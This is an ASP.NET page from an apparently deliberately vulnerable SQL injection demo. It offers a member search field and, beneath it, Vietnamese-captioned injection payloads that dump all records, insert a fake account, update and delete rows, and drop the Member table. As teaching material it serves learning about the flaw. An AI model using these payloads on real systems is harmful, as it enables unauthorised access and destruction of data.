<%@ Page Title="" Language="C#" MasterPageFile="~/Site.Master" AutoEventWireup="true" CodeBehind="Member.aspx.cs" Inherits="SQLInjection.Member" %>

<asp:Content ID="Content3" ContentPlaceHolderID="MainContent" runat="server">
    <h2>Tìm kiếm thông tin Member</h2>
    <br />
    &nbsp;<span>Nhập vào UserName
    </span>

    <asp:TextBox ID="txtQuery" runat="server" CssClass="input-xxlarge"></asp:TextBox>
    <asp:Button ID="btnTim" runat="server" Text="Tìm kiếm" CssClass="btn btn-primary" OnClick="btnTim_Click"/>
    <br />
    [ 'OR '1'='1 ] -Lấy tất cả thông tin mảng member<br />
[ '; Insert into Member (UserName, Password) values('Haker','Haked'); --'; ] Thêm vào CSDL  <br />
[ '; Update Member Set UserName='name' where UserName='lastname'; --'; ] Cập nhật vào CSDL <br />
[ '; delete from member where UserName='admin'; --' ] Xóa dòng CSDL  <br />
[ '; DROP TABLE Member; --'; ] Xóa luôn bảng Member <br />
    <asp:GridView ID="GridView1" runat="server"></asp:GridView>
</asp:Content>
